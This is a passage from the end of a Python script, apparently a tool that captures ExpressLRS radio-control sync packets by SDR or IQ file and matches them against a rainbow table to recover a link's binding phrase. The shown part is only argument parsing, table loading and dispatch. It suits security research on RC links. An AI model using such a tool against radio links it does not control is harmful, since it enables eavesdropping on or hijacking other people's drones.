    sdr_group.add_argument("--sdr-device", default="",
                           help="SoapySDR device string")
    sdr_group.add_argument("--sdr-rate", type=float, default=None,
                           help="Sample rate (default: 2 Msps)")
    sdr_group.add_argument("--sdr-gain", type=float, default=None,
                           help="RF gain in dB (default: 40)")
    sdr_group.add_argument("--sdr-antenna", default=None,
                           help="Antenna port name")
    sdr_group.add_argument("--sdr-bandwidth", type=float, default=None,
                           help="Analog filter bandwidth in Hz")
    sdr_group.add_argument("--sdr-channel", type=int, default=0,
                           help="SDR channel index (default: 0)")

    scan_group = parser.add_argument_group("Scan options")
    scan_group.add_argument(
        "--channels", metavar="LIST",
        help="Comma-separated FHSS channel indices to scan (default: sync channels 40,41)",
    )
    scan_group.add_argument(
        "--dwell-ms", type=int, default=200,
        help="Dwell time per channel in ms for SDR mode (default: 200)",
    )
    scan_group.add_argument(
        "--sf", type=int, default=7, choices=[5, 6, 7],
        help="LoRa spreading factor (default: 7, for 150Hz/250Hz rates)",
    )

    output_group = parser.add_argument_group("Output options")
    output_group.add_argument(
        "--rainbow", "-r", metavar="FILE",
        help="Rainbow table JSON (default: auto-detect in tools/)",
    )
    output_group.add_argument(
        "--json", action="store_true",
        help="Output structured JSON lines",
    )
    output_group.add_argument(
        "--one-shot", action="store_true",
        help="Stop after first rainbow table match",
    )
    output_group.add_argument(
        "--summary", action="store_true",
        help="Print capture summary at exit",
    )

    args = parser.parse_args()

    # Auto-detect rainbow table
    rainbow_path = args.rainbow
    if not rainbow_path:
        candidates = [
            _TOOLS_DIR / "elrs-rainbow-table.json",
            Path("tools/elrs-rainbow-table.json"),
            Path("elrs-rainbow-table.json"),
        ]
        for c in candidates:
            if c.exists():
                rainbow_path = str(c)
                break

    rainbow = load_rainbow_table(rainbow_path)
    if rainbow:
        n_entries = sum(len(v) for v in rainbow.values())
        log(f"Rainbow table loaded: {n_entries} phrases, {len(rainbow)} unique uid4:uid5 keys")
    else:
        log("No rainbow table loaded (use --rainbow to specify)")

    tracker = SyncTracker(rainbow=rainbow, one_shot=args.one_shot)

    # Handle graceful shutdown
    def handle_sigint(sig, frame):
        log("Interrupted — printing summary")
        if args.summary or args.json:
            summary = tracker.get_summary()
            if args.json:
                print(json.dumps({"event": "summary", **summary}, default=str),
                      flush=True)
            else:
                print(json.dumps(summary, indent=2, default=str), file=sys.stderr)
        sys.exit(0)

    signal.signal(signal.SIGINT, handle_sigint)

    # Dispatch to input handler
    if args.stdin_raw:
        process_stdin_raw(tracker, args.json)

    elif args.iq_file:
        if not HAS_NUMPY:
            log_err("NumPy required for IQ file processing. Install: pip install numpy")
            sys.exit(1)
        if not args.sample_rate:
            log_err("--sample-rate required for IQ file input")
            sys.exit(1)
        if not args.center_freq:
            log_err("--center-freq required for IQ file input")
            sys.exit(1)

        channels = None
        if args.channels:
            channels = [int(c) for c in args.channels.split(",")]

        iq = read_iq_file(args.iq_file, args.sample_rate, args.center_freq,
                          args.iq_format)
        scan_iq_for_syncs(iq, args.sample_rate, args.center_freq,
                          tracker, channels=channels,
                          json_output=args.json, sf=args.sf)

    elif args.sdr:
        if not HAS_NUMPY:
            log_err("NumPy required for SDR capture. Install: pip install numpy")
            sys.exit(1)
        run_sdr_capture(tracker, args, args.json)

    elif args.self_test:
        run_selftest(tracker, args.json)

    else:
        log("No input source specified. Use --stdin-raw, --iq-file, --sdr, or --self-test.")
        parser.print_help(sys.stderr)
        sys.exit(1)

    # Print summary
    if args.summary or args.json:
        summary = tracker.get_summary()
        if args.json:
            print(json.dumps({"event": "summary", **summary}, default=str), flush=True)
        else:
            print(json.dumps(summary, indent=2, default=str), file=sys.stderr)

    # Exit with match status
    if tracker.matched and args.json:
        print(json.dumps(tracker.match_result, default=str), flush=True)

    sys.exit(0 if tracker.matched or not args.one_shot else 1)


if __name__ == "__main__":
    main()
